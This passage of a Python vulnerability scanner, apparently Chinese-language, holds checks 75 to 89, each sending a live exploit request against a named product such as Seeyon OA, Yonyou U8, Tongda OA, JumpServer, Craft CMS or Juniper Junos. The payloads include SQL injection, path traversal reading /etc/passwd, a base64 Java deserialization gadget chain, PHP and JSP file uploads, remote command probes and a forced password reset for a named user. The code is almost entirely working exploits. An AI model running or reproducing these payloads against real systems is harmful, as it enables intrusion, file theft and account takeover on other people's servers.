            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")

    if vulnerability == "75.CVE-2021-29490":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
        }
        if url.endswith("/"):
            path = "Images/Remote?imageUrl=http://www.baidu.com"
        else:
            path = "/Images/Remote?imageUrl=http://www.baidu.com"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text
            if req.status_code == 200 and '百度一下，你就知道' in res:
                append_to_output(f"[+] {url} 存在CVE-2021-29490！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在CVE-2021-29490", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "76.网御ACM上网行为管理系统SQL注入漏洞":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
        }
        if url.endswith("/"):
            path = "bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"
        else:
            path = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'ca42' in res:
                append_to_output(f"[+] {url} 存在网御ACM上网行为管理系统SQL注入漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在网御ACM上网行为管理系统SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "77.MeterSphere customMethod 远程命令执行漏洞":

        if url.endswith("/"):
            path = "plugin/customMethod"
        else:
            path = "/plugin/customMethod"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
        }

        data = '''{"entry":"Evil","request":"id"}'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'root' in res:
                append_to_output(f"[+] {url} 存在MeterSphere customMethod 远程命令执行漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在MeterSphere customMethod 远程命令执行漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "78.致远OA_M1Server_userTokenService远程命令执行漏洞":

        if url.endswith("/"):
            path = "esn_mobile_pns/service/userTokenService"
        else:
            path = "/esn_mobile_pns/service/userTokenService"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'cmd': '@@@@@echo Test',
        }

        data = '''{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZHQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lNZXRob2RxAH4ACnhyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAACnQAGVJGOkpNb2RlbFJlc3VsdHQAG0xqYXZhL2xhbmcvU3RyaW5nO3hwc3EAfgAKc3IAJm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnlUiqsSmzlVCAIAAUwAA21hcHQAQkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAFGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwc3EAfgAJeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJUcmFuc2Zvcm1lcrN5Y+2Zs1QDAAB4cHcEAAAAAHg='''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and "Test" in res:
                append_to_output(f"[+] {url} 存在致远OA_M1Server_userTokenService远程命令执行漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在致远OA_M1Server_userTokenService远程命令执行漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "79.光伏发电测量系统目录遍历漏洞(CVE-2023-40924)":

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate",
        }
        if url.endswith("/"):
            path = "downloader.php?file=../../../../../../../../etc/passwd%00.jpg"
        else:
            path = "/downloader.php?file=../../../../../../../../etc/passwd%00.jpg"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'Error 404' not in res:
                append_to_output(f"[+] {url} 存在光伏发电测量系统目录遍历漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在光伏发电测量系统目录遍历漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")

    if vulnerability == "81.JumpServer Session 未授权访问漏洞(CVE-2023-42442)":

        if url.endswith("/"):
            path = "api/v1/terminal/sessions/"
        else:
            path = "/api/v1/terminal/sessions/"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
        }

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'id' in res:
                append_to_output(f"[+] {url} 存在JumpServer Session 未授权访问漏洞(CVE-2023-42442)！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res[0:100]} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在JumpServer Session 未授权访问漏洞(CVE-2023-42442)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "82.通达OA v2017 action_upload.php 任意文件上传漏洞":

        if url.endswith("/"):
            path = "module/ueditor/php/action_upload.php?action=uploadfile"
        else:
            path = "/module/ueditor/php/action_upload.php?action=uploadfile"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk",
        }

        data = '''-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="CONFIG[fileFieldName]"\r\n\r\nffff\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="CONFIG[fileMaxSize]"\r\n\r\n1000000000\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="CONFIG[filePathFormat]"\r\n\r\ntcmd\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\r\n\r\n.php\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="ffff"; filename="test.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo();?>\r\n-----------------------------55719851240137822763221368724\r\nContent-Disposition: form-data; name="mufile"\r\n\r\nsubmit\r\n-----------------------------55719851240137822763221368724--'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                if url.endswith("/"):
                    path = "tcmd.php"
                else:
                    path = "/tcmd.php"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url_res = 'http://' + url
                else:
                    url_res = url
                encoderes = url_res + path
                try:

                    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                    req = requests.get(encoderes, headers=headers, verify=False, timeout=15, proxies=proxies)
                    res = req.text
                    if req.status_code == 200:
                        append_to_output(f"[+] {url} 存在通达OA v2017 action_upload.php 任意文件上传漏洞！！！！",
                                         "red")

                        append_to_output(f"[+] 返回数据为: {res} ", "red")
                    else:
                        append_to_output(f"[-] {url} 不存在通达OA v2017 action_upload.php 任意文件上传漏洞",
                                         "green")
                except Timeout:
                    append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                except Exception as e:
                    append_to_output(str(e), "yellow")
            else:
                append_to_output(f"[-] {url} 不存在通达OA v2017 action_upload.php 任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "83.Craft CMS 远程代码执行漏洞(CVE-2023-41892)":

        if url.endswith("/"):
            path = "index.php"
        else:
            path = "/index.php"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
        }

        data = r'''action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, verify=False, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'Build System' in res:
                append_to_output(f"[+] {url} 存在Craft CMS 远程代码执行漏洞(CVE-2023-41892)！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在Craft CMS 远程代码执行漏洞(CVE-2023-41892)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "84.用友U8 crm客户关系管理存在任意文件上传漏洞":

        if url.endswith("/"):
            path = "ajax/getemaildata.php?DontCheckLogin=1"
        else:
            path = "/ajax/getemaildata.php?DontCheckLogin=1"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ",
        }

        data = '''------WebKitFormBoundarykS5RKgl8t3nwInMQ\r\nContent-Disposition: form-data; name="file"; filename="ceshi.php "\r\nContent-Type: text/plain\r\n\r\n<?php echo md5(1234);?>\r\n\r\n------WebKitFormBoundarykS5RKgl8t3nwInMQ'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'filePath' in res:
                append_to_output(f"[+] {url} 可能存在用友U8 crm客户关系管理存在任意文件上传漏洞！！！！", "red")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
                data = json.loads(res)
                # 获取 filePath 中的文件名
                file_path = data["filePath"]
                file_name = file_path.split("\\")[-1]
                # 从文件名中提取 "9B50"
                file_name_without_extension = file_name.split(".")[0]  # 去掉文件扩展名部分
                desired_value = file_name_without_extension[3:]  # 获取 "9B50" 部分
                # 将 "9B50" 转换为16进制并减1
                desired_hex_value = hex(int(desired_value, 16) - 1)[2:]  # 转换为16进制，并去掉前缀"0x"

                # 构建UDP地址
                udp_address = "upd" + desired_hex_value

                # 添加 ".tmp.php" 扩展名
                final_filename = udp_address + ".tmp.php"
                append_to_output(f"[+] 重组后的文件名: {final_filename} ", "red")

                if url.endswith("/"):
                    path = "tmpfile/"
                else:
                    path = "/tmpfile/"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url_res = 'http://' + url
                else:
                    url_res = url
                encoderes = url_res + path + final_filename
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Connection": "close",
                }
                try:

                    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                    req = requests.get(encoderes, headers=headers, verify=False, timeout=15, proxies=proxies)
                    res = req.text
                    if req.status_code == 200 and '81dc9bdb52' in res:
                        append_to_output(f"[+] {url} 确认无误，得到了我们想要的md5值！！！！", "red")

                        append_to_output(f"[+] 返回数据为: {res} ", "red")
                    else:
                        append_to_output(f"[-] {url} 不存在用友U8 crm客户关系管理存在任意文件上传漏洞", "green")
                except Timeout:
                    append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                except Exception as e:
                    append_to_output(str(e), "yellow")
            else:
                append_to_output(f"[-] {url} 不存在用友U8 crm客户关系管理存在任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "85.万户ezOFFICE存在未授权访问漏洞":

        if url.endswith("/"):
            path = "defaultroot/evoInterfaceServlet?paramType=user"
        else:
            path = "/defaultroot/evoInterfaceServlet?paramType=user"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
        }

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.get(encodetext, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'data' in res:
                append_to_output(f"[+] {url} 存在万户ezOFFICE存在未授权访问漏洞！！！！", "red")
                append_to_output(f"[+] 返回数据为: {res} ", "yellow")
            else:
                append_to_output(f"[-] {url} 不存在万户ezOFFICE存在未授权访问漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "86.用友移动管理系统存在任意文件上传漏洞":

        if url.endswith("/"):
            path = "maportal/appmanager/uploadApk.dopk_obj="
        else:
            path = "/maportal/appmanager/uploadApk.dopk_obj="

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = '''--fa48ebfef59b133a8cd5275661b35d2c\r\nContent-Disposition: form-data; name="downloadpath"; filename="59209.jsp"\r\nContent-Type: application/msword\r\n\r\n082863327\r\n--fa48ebfef59b133a8cd5275661b35d2c--'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and '{"status":2}' in res:
                append_to_output(f"[+] {url} 存在用友用友移动管理系统存在任意文件上传漏洞！！！！", "yellow")

                append_to_output(f"[+] 返回数据为: {res} ", "red")

                if url.endswith("/"):
                    path = "maupload/apk/59209.jsp"
                else:
                    path = "/maupload/apk/59209.jsp"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url_res = 'http://' + url
                else:
                    url_res = url
                encoderes = url_res + path
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Connection": "close",
                }
                try:

                    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                    req = requests.get(encoderes, headers=headers, verify=False, timeout=15, proxies=proxies)
                    res = req.text
                    if req.status_code == 200 and '082863327' in res:
                        append_to_output(f"[+] {url} 确认无误，得到了我们想要的值！！！！", "yellow")

                        append_to_output(f"[+] 返回数据为: {res} ", "red")
                    else:
                        append_to_output(f"[-] {url} 不存在用友用友移动管理系统存在任意文件上传漏洞", "green")
                except Timeout:
                    append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                except Exception as e:
                    append_to_output(str(e), "yellow")
            else:
                append_to_output(f"[-] {url} 不存在用友用友移动管理系统存在任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "87.致远OA resetPassword任意用户密码修改漏洞":

        if url.endswith("/"):
            path = "seeyon/rest/phoneLogin/phoneCode/resetPassword"
        else:
            path = "/seeyon/rest/phoneLogin/phoneCode/resetPassword"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
        }

        data = '''{"loginName":"liqiang","password":"123456"}'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'succuss' in res:
                append_to_output(f"[+] {url} 存在致远OA resetPassword任意用户密码修改漏洞！！！！", "yellow")

                append_to_output(f"[+] 返回数据为: {res} ", "red")
            else:
                append_to_output(f"[-] {url} 不存在致远OA resetPassword任意用户密码修改漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "88.Juniper Networks Junos OS EX远程命令执行漏洞(CVE-2023-36845)":

        if url.endswith("/"):
            path = "?PHPRC=/dev/fd/0"
        else:
            path = "/?PHPRC=/dev/fd/0"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Connection": "close",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua": '"-Not.A/Brand";v="8", "Chromium";v="102"',
        }

        data = '''auto_prepend_file="/etc/passwd"'''

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'root' in res:
                append_to_output(f"[+] {url} 存在Juniper Networks Junos OS EX远程命令执行漏洞(CVE-2023-36845)！！！！",
                                 "red")
                append_to_output(f"[+] 返回数据为: {res} ", "yellow")
            else:
                append_to_output(f"[-] {url} 不存在Juniper Networks Junos OS EX远程命令执行漏洞(CVE-2023-36845)",
                                 "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "89.华测监测预警系统 2.2 存在任意文件读取漏洞":
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        if url.endswith("/"):
            path = "Handler/FileDownLoad.ashx"
        else:
            path = "/Handler/FileDownLoad.ashx"

        if not url.startswith('http://') and not url.startswith('https://'):
            url_new = 'http://' + url
        else:
            url_new = url
        encodetext = url_new + path
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = '''filename=1&filepath=..%2F..%2Fweb.config'''
        append_to_output("===================================================================", "green")
        try:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.get(encodetext, data=data, headers=headers, verify=False, timeout=15, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在华测监测预警系统 2.2 存在任意文件读取漏洞！！！！", "red")
                append_to_output(f"[+] 返回数据为: {res} ", "yellow")
            else:
                append_to_output(f"[-] {url} 不存在华测监测预警系统 2.2 存在任意文件读取漏洞", "green")
        except Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except Exception as e:
            append_to_output(str(e), "yellow")
